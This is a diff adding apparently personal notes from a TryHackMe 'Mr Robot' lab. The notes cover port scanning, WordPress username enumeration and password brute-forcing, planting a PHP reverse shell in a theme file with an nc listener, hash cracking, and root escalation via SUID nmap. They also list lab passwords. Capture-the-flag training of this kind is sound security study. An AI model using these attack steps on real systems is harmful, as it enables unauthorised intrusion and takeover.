@@ -1,0 +1,78 @@
+nmap -T4 -p- -A 10.10.173.200 -oN /home/jeff/machines/MrRobot/MrRobot-nmap
+	22 closed
+	80 http
+	443 http
+	
+dirb http://10.10.173.200/ /usr/share/wordlists/dirb/common.txt -o /home/jeff/machines/MrRobot/mrrobot-dirb
+	/robots.txt
+		/key-1-of-3.txt
+			First key!
+		fsocity.dic
+			its a wordlist
+			
+	/wp-login.php
+		wordpress login page
+		
+Burp Suite to find usernames
+	-capture a request from the login page
+	-send it to Intruder
+	-upload the fsocity.dic file into the payload
+	-highlight the username attempt between 2 $$
+	-Attack
+	-Elliot is larger than the rest - must be a valid username
+	
+wpscan to bruteforce a password
+	wpscan --url http://10.10.173.200/wp-login.php -U Elliot -P /usr/share/wordlists/rockyou.txt
+		password - ER28-0652
+	
+There is a second user on the blog
+	mich05654
+	
+Pentestmonkey reverse php shell
+	replace the text in the 404.php under Appearance/Editor/404.php
+	
+nc -nvlp 4444
+
+navigate to the 404 page
+	http://10.10.173.200/wordpress/wp-content/themes/twentyfifteen/404.php
+	
+Successful reverse shell
+
+run this to stabilize the shell - python -c 'import pty; pty.spawn("/bin/bash")'
+
+/home/robot there is 2 files
+	key-2-of-3.txt
+	password.raw-md5
+	
+copy the password file
+
+hashcat to crack it - result = 	abcdefghijklmnopqrstuvwxyz
+
+switch user to robot
+	su robot
+	password abcdefghijklmnopqrstuvwxyz
+	
+cat key-2-of-3.txt
+
+Privilege Escalation
+
+robot has no sudo access
+
+run this to find all files with SUID bit set - find / -perm -u=s -type f 2>/dev/null
+
+Hint on tryhackme says 'nmap'
+	/usr/local/bin/nmap - shows up in the search results
+	
+gtfobins 
+	Sudo for nmap
+		nmap --interactive
+		!sh
+		
+root access!
+
+cd root
+	ls
+		cat key-3-of-3.txt
+
+Completed!!
+	
